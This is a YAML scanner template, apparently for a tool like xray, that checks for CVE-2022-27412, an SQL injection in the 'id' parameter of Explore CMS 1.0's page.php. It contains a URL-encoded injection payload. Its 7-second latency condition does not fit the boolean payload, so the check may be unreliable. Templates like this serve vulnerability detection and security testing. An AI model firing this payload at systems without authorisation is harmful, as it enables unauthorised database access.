id: CVE-2022-27412

info:
  name: Explore CMS 1.0 - SQL Injection
  author: daffainfo
  severity: critical
  description: SQL注入是一种web安全漏洞，允许攻击者干扰应用程序对其数据库进行的查询。exploreCMS易受“page”页的“id”参数中的SQL注入攻击。
  reference:
    - https://www.exploit-db.com/exploits/50920

rules:
  r0:
    request:
      method: GET
      path: /page.php?id=1%27%20OR%201%3d1%20OR%20%27ns%27%3d%27ns
      headers:
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
        Accept-Encoding: gzip, deflate
        Accept-Language: en-us,en;q=0.5
        Cache-Control: no-cache
        Cookie: PHPSESSID=b4c39f2ff3b9470f39bc088ab9ba9320
    expression: response.status == 200 && response.latency >=7000
expression: r0()